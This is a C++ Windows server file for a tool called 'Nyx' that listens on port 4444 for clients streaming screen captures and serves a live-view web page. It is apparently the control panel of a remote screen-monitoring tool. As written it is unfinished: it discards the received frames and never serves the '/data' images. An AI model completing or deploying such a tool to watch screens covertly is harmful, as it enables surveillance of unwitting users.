// server.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#pragma comment(lib, "ws2_32.lib")

const int PORT = 5000;
const int CLIENT_PORT = 4444;

std::string html = R"(
<!DOCTYPE html>
<html><head><title>Nyx</title>
<style>body{background:#000;color:#0f0;font-family:monospace;}</style>
</head><body>
<h1>Nyx Live</h1>
<div id="s"></div>
<script>
setInterval(()=>{fetch('/data').then(r=>r.text()).then(d=>{document.getElementById('s').innerHTML = '<img src="data:image/jpeg;base64,'+d+'">';});}, 600);
</script>
</body></html>
)";

void HandleClient(SOCKET client) {
    while (true) {
        int len;
        int recvResult = recv(client, (char*)&len, 4, 0);
        if (recvResult <= 0) break;
        std::vector<char> buf(len);
        int total = 0;
        while (total < len) {
            int got = recv(client, buf.data() + total, len - total, 0);
            if (got <= 0) break;
            total += got;
        }
        // For now, just ignore the received screen data
    }
    closesocket(client);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    
    // Start a separate thread for the client screen‑capture listener
    std::thread([](){
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in a{};
        a.sin_family = AF_INET;
        a.sin_port = htons(CLIENT_PORT);
        a.sin_addr.s_addr = INADDR_ANY;
        bind(s, (sockaddr*)&a, sizeof(a));
        listen(s, 5);
        while (true) {
            SOCKET c = accept(s, NULL, NULL);
            std::thread(HandleClient, c).detach();
        }
    }).detach();
    
    // HTTP server
    SOCKET http = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(http, (sockaddr*)&addr, sizeof(addr));
    listen(http, 10);
    
    // Removed blocking MessageBox – server now starts immediately
    // (If you want a notification, print to console or use a non‑blocking thread)
    printf("Nyx Server running on http://127.0.0.1:%d\n", PORT);
    
    while (true) {
        SOCKET conn = accept(http, NULL, NULL);
        
        // Build the full HTTP response
        std::string response =
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: " + std::to_string(html.size()) + "\r\n"
            "Connection: close\r\n"
            "\r\n" + html;
        
        send(conn, response.c_str(), response.size(), 0);
        closesocket(conn);
    }
    
    WSACleanup();
    return 0;
}